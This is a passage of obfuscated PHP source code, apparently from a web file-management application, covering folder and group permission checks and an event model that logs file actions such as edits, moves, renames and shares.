$õÙ™Æğ£ = $this->authMake($Õíûµ»[$Ïã‡…ìÍ], $©Çà±›ß); if ($õÙ™Æğ£[$¾”—ƒ«¦[544]]) { $¡ÃšÌ„¢ = $õÙ™Æğ£; break; } } if (!$Ù÷¡·›ã) { return $¡ÃšÌ„¢; } if (!$¡ÃšÌ„¢ && $íÖô–°ª) { $¡ÃšÌ„¢ = $this->groupAuthInfo($íÖô–°ª, $’ÆÂ±–È); } if (!$¡ÃšÌ„¢) { $¼íÀ‚‹ = Model($¾”—ƒ«¦[589])->getInfo($’ÆÂ±–È); $²º¾‡è÷ = explode($¾”—ƒ«¦[50], trim($¼íÀ‚‹[$¾”—ƒ«¦[588]], $¾”—ƒ«¦[50])); $²º¾‡è÷ = array_reverse($²º¾‡è÷); foreach ($²º¾‡è÷ as $ßÁúòÖª) { if ($ßÁúòÖª == $¾”—ƒ«¦[231] || $ßÁúòÖª == $ø¿Í”Œ”) { continue; } $‚Ñ•¢ë = $this->groupRootAuth($ßÁúòÖª, $©Çà±›ß); if (!$‚Ñ•¢ë) { continue; } $¡ÃšÌ„¢ = $this->groupAuthInfo($‚Ñ•¢ë, $ßÁúòÖª); break; } } if (!$¡ÃšÌ„¢ || $¡ÃšÌ„¢[$¾”—ƒ«¦[490]] <= 0) { $şÔí¶ÊØ = $this->authDeepCheck($ó½ÁÁùš[$¾”—ƒ«¦[194]], $©Çà±›ß); if ($şÔí¶ÊØ) { $¡ÃšÌ„¢ = $şÔí¶ÊØ; } } return $¡ÃšÌ„¢; } private function userIsRoot($íÚÒ•ë = false) { $ôûÇãıÃ =& $_SERVER[ıÚ˜š²İ]; if (!$íÚÒ•ë && KodUser::isRoot()) { return !0; } $­œÍºè = Model($ôûÇãıÃ[601])->getInfo($íÚÒ•ë); $ê Äí¨— = Model($ôûÇãıÃ[2201])->listData($­œÍºè[$ôûÇãıÃ[2202]]); if ($ê Äí¨— && $ê Äí¨—[$ôûÇãıÃ[579]][$ôûÇãıÃ[2203]] == 1) { return !0; } return !1; } private function sourceAuthInfo($À€Ç÷’) { $¤­Öë£¡ =& $_SERVER[ıÚ˜š²İ]; $ÛÁûÎëŒ = Model($¤­Öë£¡[1442]); $ñëùÂ—Ò = $ÛÁûÎëŒ->sourceInfo($À€Ç÷’); if (!$ñëùÂ—Ò) { return !1; } $ÛÁûÎëŒ->groupPathDisplay($ñëùÂ—Ò); $çöúéšó = array($ñëùÂ—Ò); $çöúéšó = $ÛÁûÎëŒ->_listAppendPath($çöúéšó); $ñëùÂ—Ò = $çöúéšó[0]; $ˆ³¾É¹¾ = $ñëùÂ—Ò[$¤­Öë£¡[586]]; if (isset($ñëùÂ—Ò[$¤­Öë£¡[594]])) { $ğÍ°×¸ = explode($¤­Öë£¡[8], trim($ñëùÂ—Ò[$¤­Öë£¡[586]], $¤­Öë£¡[8])); array_shift($ğÍ°×¸); $ˆ³¾É¹¾ = $ñëùÂ—Ò[$¤­Öë£¡[592]] . $¤­Öë£¡[2204] . implode($¤­Öë£¡[8], $ğÍ°×¸); } return array($¤­Öë£¡[496] => $ñëùÂ—Ò[$¤­Öë£¡[32]], $¤­Öë£¡[87] => KodIO::make($ñëùÂ—Ò[$¤­Öë£¡[194]]), $¤­Öë£¡[2205] => $ˆ³¾É¹¾); } private function groupAuthInfo($ˆ­¾Ñ¹, $µÕ¢º§È) { $Õ’Øåäì =& $_SERVER[ıÚ˜š²İ]; $’·ÍøÚ§ = Model($Õ’Øåäì[589])->getInfo($µÕ¢º§È); return array($Õ’Øåäì[2206] => intval($ˆ­¾Ñ¹[$Õ’Øåäì[489]]), $Õ’Øåäì[2189] => $ˆ­¾Ñ¹, $Õ’Øåäì[2207] => LNG($Õ’Øåäì[2208]), $Õ’Øåäì[2198] => array($Õ’Øåäì[496] => $’·ÍøÚ§[$Õ’Øåäì[32]], $Õ’Øåäì[87] => KodIO::make($’·ÍøÚ§[$Õ’Øåäì[90]][$Õ’Øåäì[194]]), $Õ’Øåäì[2205] => $’·ÍøÚ§[$Õ’Øåäì[593]])); } protected function groupRootAuth($šİ¤•¢ò, $ÄÀÜÉç’ = false) { $¿ üøÉ =& $_SERVER[ıÚ˜š²İ]; $ÄÀÜÉç’ = $ÄÀÜÉç’ ? $ÄÀÜÉç’ : USER_ID; $™…Î•—¼ = $ÄÀÜÉç’ . $¿ üøÉ[2209] . $šİ¤•¢ò; static $†…ÇŠ…ç = array(); if (isset($†…ÇŠ…ç[$™…Î•—¼])) { return $†…ÇŠ…ç[$™…Î•—¼]; } $Âœ×¡–ç = Model($¿ üøÉ[589])->getInfo($šİ¤•¢ò); $ÉÂÕÉè = $this->userGroupList($ÄÀÜÉç’); $ªá‰Òú¡ = isset($ÉÂÕÉè[$šİ¤•¢ò]) ? $ÉÂÕÉè[$šİ¤•¢ò][$¿ üøÉ[489]] : !1; if ($ªá‰Òú¡ && Model($¿ üøÉ[575])->authCheckAction($ªá‰Òú¡[$¿ üøÉ[489]], $¿ üøÉ[2014])) { $†…ÇŠ…ç[$™…Î•—¼] = $ªá‰Òú¡; return $ªá‰Òú¡; } $ïß‹Ñ­ı = $this->sourceAuthSelect($Âœ×¡–ç[$¿ üøÉ[90]][$¿ üøÉ[194]]); $¤Å™ Ã‚ = $ïß‹Ñ­ı ? $this->authMake($ïß‹Ñ­ı, $ÄÀÜÉç’) : !1; $ªÉæË´ú = $¤Å™ Ã‚ ? $¤Å™ Ã‚[$¿ üøÉ[544]] : !1; $†…ÇŠ…ç[$™…Î•—¼] = $ªÉæË´ú ? $ªÉæË´ú : $ªá‰Òú¡; return $†…ÇŠ…ç[$™…Î•—¼]; } public function authOwnerApply($Ê‚äï¤ç) { $¢’Í¦¨ =& $_SERVER[ıÚ˜š²İ]; if (empty($Ê‚äï¤ç[$¢’Í¦¨[489]]) || isset($Ê‚äï¤ç[$¢’Í¦¨[2210]]) && $Ê‚äï¤ç[$¢’Í¦¨[2210]]) { return $Ê‚äï¤ç; } if (AuthModel::authCheckRoot($Ê‚äï¤ç[$¢’Í¦¨[489]][$¢’Í¦¨[490]])) { return $Ê‚äï¤ç; } $áÍ¤ÃÎË = Model($¢’Í¦¨[1442])->parentLevelArray($Ê‚äï¤ç[$¢’Í¦¨[588]]); $áÍ¤ÃÎË = array_merge(array($Ê‚äï¤ç[$¢’Í¦¨[194]]), array_reverse($áÍ¤ÃÎË)); $áÔ¬ÁÒÓ = $this->sourceAuthSelect($áÍ¤ÃÎË); $ìğ°›¾ = array(); $£À—Öùü = array(); foreach ($áÔ¬ÁÒÓ as $–ô­ùûş => $©Öâ¡¹ª) { $Âõô¶ş’ = $this->authFolderOwnerUser($©Öâ¡¹ª); $ìğ°›¾[$–ô­ùûş] = $Âõô¶ş’; $£À—Öùü = array_merge($£À—Öùü, $Âõô¶ş’[$¢’Í¦¨[669]]); if ($Âõô¶ş’[$¢’Í¦¨[2211]]) { break; } } if (count($£À—Öùü) == 0) { $£À—Öùü = $this->authFolderOwnerGroup($Ê‚äï¤ç[$¢’Í¦¨[573]]); } $£À—Öùü = array_unique($£À—Öùü); if (AuthModel::authCheckRoot($Ê‚äï¤ç[$¢’Í¦¨[489]][$¢’Í¦¨[490]])) { $£À—Öùü[] = USER_ID; } $Ê‚äï¤ç[$¢’Í¦¨[489]][$¢’Í¦¨[2212]] = Model($¢’Í¦¨[581])->userListInfo($£À—Öùü); return $Ê‚äï¤ç; } private function authFolderOwnerGroup($ÙÎá€éÔ) { $óø÷»ÖÅ =& $_SERVER[ıÚ˜š²İ]; $ê­­ª•î = Model($óø÷»ÖÅ[2088])->where(array($óø÷»ÖÅ[1404] => $ÙÎá€éÔ))->select(); $Ğ©€ôºĞ = array(); if (!$ê­­ª•î) { return $Ğ©€ôºĞ; } foreach ($ê­­ª•î as $‹¼„§†) { $ìÂ Èµ¨ = $this->authInfo($‹¼„§†); if (AuthModel::authCheckRoot($ìÂ Èµ¨[$óø÷»ÖÅ[489]])) { $Ğ©€ôºĞ[] = $‹¼„§†[$óø÷»ÖÅ[1792]]; } } return $Ğ©€ôºĞ; } private function authFolderOwnerUser($Í¸é÷Œ) { $­íçÚª‘ =& $_SERVER[ıÚ˜š²İ]; $û˜§…Ö = array(); $Ğ·ÏÔ…Š = !1; foreach ($Í¸é÷Œ as $¸¼Ì”½) { $ó€÷âÀÆ = $this->authInfo($¸¼Ì”½); if ($¸¼Ì”½[$­íçÚª‘[573]] == $­íçÚª‘[231]) { $Ğ·ÏÔ…Š = !0; } if ($¸¼Ì”½[$­íçÚª‘[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ó€÷âÀÆ[$­íçÚª‘[489]])) { $û˜§…Ö[] = $¸¼Ì”½[$­íçÚª‘[573]]; } } } return array($­íçÚª‘[669] => $û˜§…Ö, $­íçÚª‘[2211] => $Ğ·ÏÔ…Š); } public function authMake($ÒÎ«€Ë‹, $ªËÌÅ± = false) { $½ùıªŠè =& $_SERVER[ıÚ˜š²İ]; $æÏß¯İô = $this->authArrayCheck($ÒÎ«€Ë‹, $ªËÌÅ±); if ($æÏß¯İô[$½ùıªŠè[2213]]) { $æÏß¯İô[$½ùıªŠè[2213]] = $this->sourceAuthInfo($æÏß¯İô[$½ùıªŠè[2213]]); } return $æÏß¯İô; } public function authArrayCheck($ËÎÌĞ, $Á©¯ŠÖ´ = false) { $™ŠÎÔ”µ =& $_SERVER[ıÚ˜š²İ]; if (!$ËÎÌĞ) { return array($™ŠÎÔ”µ[490] => 0, $™ŠÎÔ”µ[544] => !1); } $Á©¯ŠÖ´ = $Á©¯ŠÖ´ ? $Á©¯ŠÖ´ : USER_ID; $—şÌ®µ¸ = 0; $Ä‡Ê¨ü = 0; $üÛÑÎ¼ = 0; $²“É = 0; $ı¨á = 0; $ˆ¥ğºƒÏ = 0; $—‹Î¾ò = 1000; $ÚİÎ…×É = 0; $àÜåûš± = 0; $½Èüêœ = 0; $ªöúÖ¿€ = 0; $¶¸ßÁˆ = array($™ŠÎÔ”µ[194] => 0); foreach ($ËÎÌĞ as $¶¸ßÁˆ) { $ö½Œ©Â³ = $this->authInfo($¶¸ßÁˆ); if (!$ö½Œ©Â³) { continue; } $úÔüë¸ = $¶¸ßÁˆ[$™ŠÎÔ”µ[573]]; $¿Ê«ÉÜ¤ = intval($ö½Œ©Â³[$™ŠÎÔ”µ[489]]); if ($¶¸ßÁˆ[$™ŠÎÔ”µ[191]] == SourceModel::TYPE_USER && $úÔüë¸ == $Á©¯ŠÖ´) { $—şÌ®µ¸ = !0; $üÛÑÎ¼ = $ö½Œ©Â³; $Ä‡Ê¨ü = $¿Ê«ÉÜ¤; } else { if ($¶¸ßÁˆ[$™ŠÎÔ”µ[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($úÔüë¸, $Á©¯ŠÖ´)) { $²“É = !0; $úú‡˜¢ = $this->groupStepToUserGroup($úÔüë¸, $Á©¯ŠÖ´); if ($úú‡˜¢ < $—‹Î¾ò) { $—‹Î¾ò = $úú‡˜¢; $ı¨á = $¿Ê«ÉÜ¤; $ˆ¥ğºƒÏ = $ö½Œ©Â³; $ÚİÎ…×É = $úÔüë¸; } if ($úú‡˜¢ == $—‹Î¾ò && $¿Ê«ÉÜ¤ >= $ı¨á) { $ı¨á = $¿Ê«ÉÜ¤; $ˆ¥ğºƒÏ = $ö½Œ©Â³; $ÚİÎ…×É = $úÔüë¸; } } else { if ($úÔüë¸ == $™ŠÎÔ”µ[231]) { $àÜåûš± = !0; $ªöúÖ¿€ = $ö½Œ©Â³; $½Èüêœ = $¿Ê«ÉÜ¤; } } } } if ($—şÌ®µ¸) { $‹ì¹šù = $Ä‡Ê¨ü; $ö½Œ©Â³ = $üÛÑÎ¼; $Œ‰Ûñ†¾ = LNG($™ŠÎÔ”µ[2214]); } else { if ($²“É) { $‹ì¹šù = $ı¨á; $ö½Œ©Â³ = $ˆ¥ğºƒÏ; $Ôø—êˆ = Model($™ŠÎÔ”µ[589])->getInfo($ÚİÎ…×É); $Œ‰Ûñ†¾ = $™ŠÎÔ”µ[176] . $Ôø—êˆ[$™ŠÎÔ”µ[593]] . $™ŠÎÔ”µ[2215] . LNG($™ŠÎÔ”µ[2216]); } else { if ($àÜåûš±) { $‹ì¹šù = $½Èüêœ; $ö½Œ©Â³ = $ªöúÖ¿€; $Œ‰Ûñ†¾ = LNG($™ŠÎÔ”µ[2187]); } else { $‹ì¹šù = 0; $ö½Œ©Â³ = !1; $Œ‰Ûñ†¾ = $™ŠÎÔ”µ[12]; } } } $¯şª¾öÎ = array($™ŠÎÔ”µ[2206] => intval($‹ì¹šù), $™ŠÎÔ”µ[2189] => $ö½Œ©Â³, $™ŠÎÔ”µ[2207] => $Œ‰Ûñ†¾, $™ŠÎÔ”µ[2198] => $¶¸ßÁˆ[$™ŠÎÔ”µ[194]]); return $¯şª¾öÎ; } private function groupContainUser($¨Õ¹•Ò², $É‘Õı£Õ = false) { return in_array($¨Õ¹•Ò², $this->userGroupParents($É‘Õı£Õ)); } private function groupStepToUserGroup($ÚÈ¥ÌÖ¦, $³á¸¸»í = false) { $æÕºàËØ =& $_SERVER[ıÚ˜š²İ]; $©‘ÑéÒ = $this->userGroupList($³á¸¸»í); $ÄÓøìÈŸ = 1000; $°÷Àƒ÷õ = $GLOBALS[$æÕºàËØ[6]][$æÕºàËØ[92]][$æÕºàËØ[2101]] == 1; $ÜÙ…Ä‡– = $°÷Àƒ÷õ ? 3 : 2; foreach ($©‘ÑéÒ as $Ü¢ş†æş) { if ($Ü¢ş†æş[$æÕºàËØ[1404]] == $ÚÈ¥ÌÖ¦) { return 0; } $àíıÃ¢‘ = explode($æÕºàËØ[50], trim($Ü¢ş†æş[$æÕºàËØ[588]], $æÕºàËØ[50])); if ($àíıÃ¢‘[0] == $æÕºàËØ[231] && count($àíıÃ¢‘) > $ÜÙ…Ä‡–) { $ºËŸ = array_reverse(array_slice($àíıÃ¢‘, $ÜÙ…Ä‡–)); $±å½ ÷Æ = array_search($ÚÈ¥ÌÖ¦, $ºËŸ); if ($±å½ ÷Æ !== !1 && $±å½ ÷Æ + 1 <= $ÄÓøìÈŸ) { $ÄÓøìÈŸ = $±å½ ÷Æ + 1; } } } return $ÄÓøìÈŸ; } private function userGroupList($«ç½„Ë = false) { $‘ÛœÆ× =& $_SERVER[ıÚ˜š²İ]; static $Öçœğ„² = array(); if (isset($Öçœğ„²[$«ç½„Ë])) { return $Öçœğ„²[$«ç½„Ë]; } $ÂÈ¸ŸÊ = Model($‘ÛœÆ×[601])->getInfo($«ç½„Ë); $Öçœğ„²[$«ç½„Ë] = array_to_keyvalue($ÂÈ¸ŸÊ[$‘ÛœÆ×[1403]], $‘ÛœÆ×[1404]); return $Öçœğ„²[$«ç½„Ë]; } public function userGroupParents($†€ÌÓ×ç) { $ÊÍˆ”Ñ± =& $_SERVER[ıÚ˜š²İ]; static $èÎèÛÓ = array(); $†€ÌÓ×ç = $†€ÌÓ×ç ? $†€ÌÓ×ç : USER_ID; if (isset($èÎèÛÓ[$†€ÌÓ×ç])) { return $èÎèÛÓ[$†€ÌÓ×ç]; } $ç¹º“ë• = $this->userGroupList($†€ÌÓ×ç); $Ë Ğêâª = array(); $ˆÕ¿ ¶ = $GLOBALS[$ÊÍˆ”Ñ±[6]][$ÊÍˆ”Ñ±[92]][$ÊÍˆ”Ñ±[2101]] == 1; $Ğíõ”Ë = $ˆÕ¿ ¶ ? 3 : 2; foreach ($ç¹º“ë• as $ƒ…¹ˆÒÏ) { $¨İƒÂÉ¤ = array($ƒ…¹ˆÒÏ[$ÊÍˆ”Ñ±[1404]]); $‡×õŠõ— = explode($ÊÍˆ”Ñ±[50], trim($ƒ…¹ˆÒÏ[$ÊÍˆ”Ñ±[588]], $ÊÍˆ”Ñ±[50])); if ($‡×õŠõ—[0] == $ÊÍˆ”Ñ±[231] && count($‡×õŠõ—) > $Ğíõ”Ë) { $¼µ½«†¬ = array_slice($‡×õŠõ—, $Ğíõ”Ë); $¨İƒÂÉ¤ = array_merge($¨İƒÂÉ¤, array_reverse($¼µ½«†¬)); } $Ë Ğêâª = array_merge($Ë Ğêâª, $¨İƒÂÉ¤); } $èÎèÛÓ[$†€ÌÓ×ç] = array_unique($Ë Ğêâª); return $èÎèÛÓ[$†€ÌÓ×ç]; } public function authTargetInfoMake($¦©Äéêë) { $øŞæÑÈÌ =& $_SERVER[ıÚ˜š²İ]; $½³³†„ = array(); $ı¾æ¦ü÷ = array(); foreach ($¦©Äéêë as $Á›êğÓ­) { if ($Á›êğÓ­[$øŞæÑÈÌ[191]] == SourceModel::TYPE_USER) { $½³³†„[] = intval($Á›êğÓ­[$øŞæÑÈÌ[573]]); } else { if ($Á›êğÓ­[$øŞæÑÈÌ[191]] == SourceModel::TYPE_GROUP) { $ı¾æ¦ü÷[] = intval($Á›êğÓ­[$øŞæÑÈÌ[573]]); } } } if ($½³³†„) { $½³³†„ = Model($øŞæÑÈÌ[581])->userListInfo($½³³†„); } if ($ı¾æ¦ü÷) { $ĞŸ¥¨êß = array($øŞæÑÈÌ[2083] => array($øŞæÑÈÌ[494], $ı¾æ¦ü÷)); $ı¾æ¦ü÷ = Model($øŞæÑÈÌ[589])->field($øŞæÑÈÌ[2217])->where($ĞŸ¥¨êß)->select(); $ı¾æ¦ü÷ = array_to_keyvalue($ı¾æ¦ü÷, $øŞæÑÈÌ[1404]); } return array($øŞæÑÈÌ[2218] => $½³³†„, $øŞæÑÈÌ[2219] => $ı¾æ¦ü÷); } public function authInfo($¡É‚¹®) { $±¢˜›éµ =& $_SERVER[ıÚ˜š²İ]; if ($¡É‚¹®[$±¢˜›éµ[2102]]) { $ññŒ«ëª = Model($±¢˜›éµ[575])->listData($¡É‚¹®[$±¢˜›éµ[2102]]); if (!$ññŒ«ëª) { return !1; $¦¤Ÿ¹ßì = Model($±¢˜›éµ[575])->listData(); $‰£†¹³² = array_filter_by_field($¦¤Ÿ¹ßì, $±¢˜›éµ[489], $±¢˜›éµ[231]); return $‰£†¹³²; } $úÉ²ßø = array_field_key($ññŒ«ëª, array($±¢˜›éµ[477], $±¢˜›éµ[32], $±¢˜›éµ[489], $±¢˜›éµ[2016], $±¢˜›éµ[2017])); $úÉ²ßø[$±¢˜›éµ[2220]] = $¡É‚¹®; return $úÉ²ßø; } else { return array($±¢˜›éµ[495] => 0, $±¢˜›éµ[1999] => $¡É‚¹®[$±¢˜›éµ[2166]], $±¢˜›éµ[496] => $±¢˜›éµ[12], $±¢˜›éµ[2016] => $±¢˜›éµ[2221]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\162\x63\145\x5f\145\166\145\x6e\x74"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\x54\151\x6d\145", "\x74\x69\x6d\x65", "\x69\x6e\x73\x65\162\x74", "\146\x75\x6e\x63\x74\151\x6f\x6e"), array("\144\x65\x73\143", '', "\151\156\163\145\x72\164\54\x75\x70\x64\x61\x74\145\x2c\x73\145\x6c\x65\x63\164", "\152\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ª¸Ú²Š, $Õ’è³Ô›, $Í¦‰…Ñ = '') { $Éæ²²“¯ =& $_SERVER[ıÚ˜š²İ]; if (!$this->eventSave) { return; } $¤ı¢¥À = Model($Éæ²²“¯[1442])->sourceInfo($ª¸Ú²Š); if (!$¤ı¢¥À) { return !1; } if ($this->isDisableEvent($¤ı¢¥À, $Õ’è³Ô›)) { return; } if ($Í¦‰…Ñ && is_string($Í¦‰…Ñ)) { $Í¦‰…Ñ = array($Éæ²²“¯[2032] => $Í¦‰…Ñ); } $©ƒÂìĞ = defined($Éæ²²“¯[2222]) ? USER_ID : 0; $Á†ƒ›± = array($Éæ²²“¯[493] => $ª¸Ú²Š, $Éæ²²“¯[2223] => $¤ı¢¥À[$Éæ²²“¯[193]], $Éæ²²“¯[2224] => $¤ı¢¥À[$Éæ²²“¯[32]], $Éæ²²“¯[586] => !empty($¤ı¢¥À[$Éæ²²“¯[586]]) ? $¤ı¢¥À[$Éæ²²“¯[586]] : $Éæ²²“¯[12], $Éæ²²“¯[1783] => $©ƒÂìĞ, $Éæ²²“¯[498] => $Õ’è³Ô›, $Éæ²²“¯[1785] => $Í¦‰…Ñ); $this->addSystemLog($Õ’è³Ô›, $Á†ƒ›±); unset($Á†ƒ›±[$Éæ²²“¯[2224]], $Á†ƒ›±[$Éæ²²“¯[586]]); return $this->add($Á†ƒ›±); } private function addSystemLog($¿Ûá³Ñı, $¦”­©£Á) { $áÜ…Ä =& $_SERVER[ıÚ˜š²İ]; if ($¿Ûá³Ñı == $áÜ…Ä[2225]) { $¿Ûá³Ñı = $¦”­©£Á[$áÜ…Ä[528]][$áÜ…Ä[2226]]; } else { if (in_array($¿Ûá³Ñı, array($áÜ…Ä[1973], $áÜ…Ä[2227]))) { $¿Ûá³Ñı = $¦”­©£Á[$áÜ…Ä[528]][$áÜ…Ä[171]]; } } $Ä—ÏÎ¶½ = array_merge($¦”­©£Á, array($áÜ…Ä[2228] => $¦”­©£Á[$áÜ…Ä[194]], $áÜ…Ä[2229] => $¦”­©£Á[$áÜ…Ä[2229]])); Hook::trigger($áÜ…Ä[2230], $áÜ…Ä[2231] . $¿Ûá³Ñı, $¦”­©£Á); Model($áÜ…Ä[1937])->addLog($áÜ…Ä[2231] . $¿Ûá³Ñı, $Ä—ÏÎ¶½); } private function isDisableEvent($Ê‰¶ó“Ÿ, $ÃÂ“¹µ) { $ÒèçÁ¥§ =& $_SERVER[ıÚ˜š²İ]; if ($Ê‰¶ó“Ÿ[$ÒèçÁ¥§[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ÃÂ“¹µ == $ÒèçÁ¥§[1962]) { return !1; } return !0; } public function eventCreate($ºà—é, $Ú¦ƒ¼Ñâ) { $¾ë³»†£ =& $_SERVER[ıÚ˜š²İ]; $ºí›°£ = Model($¾ë³»†£[1442])->sourceInfo($ºà—é); $Ó°í¤Ôé = array($¾ë³»†£[2226] => $Ú¦ƒ¼Ñâ, $¾ë³»†£[32] => $ºí›°£[$¾ë³»†£[32]]); return $this->addEvent($ºà—é, $¾ë³»†£[2225], $Ó°í¤Ôé); } public function eventFileEdit($é™Ä¼ø) { $¾ÒÔî =& $_SERVER[ıÚ˜š²İ]; $±ïÌØÚÁ = array($¾ÒÔî[2232] => $_SERVER[$¾ÒÔî[2233]], $¾ÒÔî[2234] => strtolower(ACTION)); if (isset($GLOBALS[$¾ÒÔî[7]][$¾ÒÔî[2235]])) { $±ïÌØÚÁ[$¾ÒÔî[2235]] = $¾ÒÔî[91]; } return $this->addEvent($é™Ä¼ø, $¾ÒÔî[1963], $±ïÌØÚÁ); } public function eventRecycle($õÈıØÙ, $—¥ºç¼À) { return $this->addEvent($õÈıØÙ, $_SERVER[ıÚ˜š²İ][2227], $—¥ºç¼À); } private static $_removeLast = ''; public function eventRemove($şı¾Í) { $€ÇÂµ£› =& $_SERVER[ıÚ˜š²İ]; self::$_removeLast = $şı¾Í; $»ò‰üè¥ = Model($€ÇÂµ£›[1442])->sourceInfo($şı¾Í); $ÕÙ‘ò³² = array_field_key($»ò‰üè¥, array($€ÇÂµ£›[194], $€ÇÂµ£›[545], $€ÇÂµ£›[507], $€ÇÂµ£›[588])); $³ÜûÀÔ§ = array($€ÇÂµ£›[171] => $»ò‰üè¥[$€ÇÂµ£›[32]], $€ÇÂµ£›[2234] => ACTION, $€ÇÂµ£›[2236] => $ÕÙ‘ò³²); return $this->addEvent($»ò‰üè¥[$€ÇÂµ£›[193]], $€ÇÂµ£›[1962], $³ÜûÀÔ§); } public function eventShare($ªÔÖäŸµ, $ø¢¡ÒÂ) { return $this->addEvent($ªÔÖäŸµ, $_SERVER[ıÚ˜š²İ][1973], $ø¢¡ÒÂ); } public function eventMove($ĞŒÑ£¢í, $§œëã¢á, $şØ°ÖãÒ) { $¨¦ëãØó =& $_SERVER[ıÚ˜š²İ]; if (self::$_removeLast == $ĞŒÑ£¢í) { return; } $ÏØ©˜âŸ = Model($¨¦ëãØó[1442]); $—ŠáŠÈÇ = $ÏØ©˜âŸ->sourceInfo($ĞŒÑ£¢í); $Çêô¥õŞ = $ÏØ©˜âŸ->sourceInfo($§œëã¢á); $¼üşµŸä = $ÏØ©˜âŸ->sourceInfo($şØ°ÖãÒ); $íö¾‹ºå = array($¨¦ëãØó[1253] => $§œëã¢á, $¨¦ëãØó[2237] => $Çêô¥õŞ[$¨¦ëãØó[32]], $¨¦ëãØó[2213] => !empty($Çêô¥õŞ[$¨¦ëãØó[586]]) ? $Çêô¥õŞ[$¨¦ëãØó[586]] : $¨¦ëãØó[12], $¨¦ëãØó[1254] => $şØ°ÖãÒ, $¨¦ëãØó[2238] => $¼üşµŸä[$¨¦ëãØó[32]], $¨¦ëãØó[2239] => !empty($¼üşµŸä[$¨¦ëãØó[586]]) ? $¼üşµŸä[$¨¦ëãØó[586]] : $¨¦ëãØó[12]); $this->addEvent($ĞŒÑ£¢í, $¨¦ëãØó[627], $íö¾‹ºå); $—ŠáŠÈÇ = $ÏØ©˜âŸ->sourceInfo($ĞŒÑ£¢í); $íö¾‹ºå = array($¨¦ëãØó[194] => $—ŠáŠÈÇ[$¨¦ëãØó[194]], $¨¦ëãØó[32] => $—ŠáŠÈÇ[$¨¦ëãØó[32]]); $this->addEvent($§œëã¢á, $¨¦ëãØó[2240], $íö¾‹ºå); } public function eventCopy($šª¯ş©Ü) { $this->eventCreate($šª¯ş©Ü, $_SERVER[ıÚ˜š²İ][625]); } public function eventRename($Ÿø—·—, $¨›åÇï¸, $´—™‡È) { $¢ë©Œ§ =& $_SERVER[ıÚ˜š²İ]; $âŠëÍé‹ = array($¢ë©Œ§[1253] => $¨›åÇï¸, $¢ë©Œ§[1254] => $´—™‡È); return $this->addEvent($Ÿø—·—, $¢ë©Œ§[1456], $âŠëÍé‹); } public function eventAddComment($â‡ñØ¢, $ºÜ‹áµ) { return $this->addEvent($â‡ñØ¢, $_SERVER[ıÚ˜š²İ][2241], $ºÜ‹áµ); } public function eventAddDesc($ƒß»Òş, $ğùÅÖ¾ä) { return $this->addEvent($ƒß»Òş, $_SERVER[ıÚ˜š²İ][2242], $ğùÅÖ¾ä); } public function listBySource($˜Î·í†­) { $â•¨ïâÏ =& $_SERVER[ıÚ˜š²İ]; $›çÉ´­– = Model($â•¨ïâÏ[1442])->sourceInfo($˜Î·í†­); $Ô£ĞÚªÇ = array($â•¨ïâÏ[493] => $˜Î·í†­); if ($›çÉ´­–[$â•¨ïâÏ[487]] == $â•¨ïâÏ[91]) { $’˜ƒµ¡¹ = Model($â•¨ïâÏ[1442])->listSearchChildren($˜Î·í†­, 20000); $’˜ƒµ¡¹[] = $˜Î·í†­ . $â•¨ïâÏ[456]; $Ô£ĞÚªÇ = array($â•¨ïâÏ[194] => array($â•¨ïâÏ[7], $’˜ƒµ¡¹)); } $ª“…ŒÎ› = $this->where($Ô£ĞÚªÇ)->order($â•¨ïâÏ[2243])->selectPage(); if ($ª“…ŒÎ›[$â•¨ïâÏ[444]][$â•¨ïâÏ[445]] == 0) { $ª“…ŒÎ›[$â•¨ïâÏ[444]][$â•¨ïâÏ[445]] = 1; $ª“…ŒÎ›[$â•¨ïâÏ[447]] = array(array($â•¨ïâÏ[493] => $˜Î·í†­, $â•¨ïâÏ[2223] => $›çÉ´­–[$â•¨ïâÏ[193]], $â•¨ïâÏ[1783] => $›çÉ´­–[$â•¨ïâÏ[529]], $â•¨ïâÏ[498] => $â•¨ïâÏ[2244], $â•¨ïâÏ[499] => $›çÉ´­–[$â•¨ïâÏ[234]], $â•¨ïâÏ[1785] => $â•¨ïâÏ[12])); } return $this->eventListParse($ª“…ŒÎ›, $˜Î·í†­); } private function eventListParse($¶ÚâõƒÛ, $ì†·ğ¤) { $Š®´å“ğ =& $_SERVER[ıÚ˜š²İ]; $Ùò§£ŞÀ = $¶ÚâõƒÛ[$Š®´å“ğ[447]]; $á¥ºªƒ‚ = array_to_keyvalue($Ùò§£ŞÀ, $Š®´å“ğ[12], $Š®´å“ğ[194]); $º‰Æ§• = array_to_keyvalue($Ùò§£ŞÀ, $Š®´å“ğ[12], $Š®´å“ğ[2229]); foreach ($Ùò§£ŞÀ as $”¹–´õ) { $‹‹¢ûÇ² = $”¹–´õ[$Š®´å“ğ[528]]; if ($”¹–´õ[$Š®´å“ğ[33]] == $Š®´å“ğ[627] && isset($‹‹¢ûÇ²[$Š®´å“ğ[1253]])) { $á¥ºªƒ‚[] = $‹‹¢ûÇ²[$Š®´å“ğ[1253]] . $Š®´å“ğ[12]; $á¥ºªƒ‚[] = $‹‹¢ûÇ²[$Š®´å“ğ[1254]] . $Š®´å“ğ[12]; } if ($”¹–´õ[$Š®´å“ğ[33]] == $Š®´å“ğ[2240] && isset($‹‹¢ûÇ²[$Š®´å“ğ[194]])) { $á¥ºªƒ‚[] = $‹‹¢ûÇ²[$Š®´å“ğ[194]] . $Š®´å“ğ[12]; } } $á¥ºªƒ‚ = array_merge($á¥ºªƒ‚, $º‰Æ§•, array($ì†·ğ¤ . $Š®´å“ğ[12])); $á¥ºªƒ‚ = array_unique($á¥ºªƒ‚); $¨ÒËßéµ = array_unique(array_to_keyvalue($Ùò§£ŞÀ, $Š®´å“ğ[12], $Š®´å“ğ[1792])); $ººÔ¢Ïş = Model($Š®´å“ğ[601])->userListInfo($¨ÒËßéµ); $÷÷‰’ŒÄ = Model($Š®´å“ğ[907])->sourceListInfo($á¥ºªƒ‚, !0); foreach ($Ùò§£ŞÀ as &$”¹–´õ) { if ($”¹–´õ[$Š®´å“ğ[33]] == $Š®´å“ğ[627] && 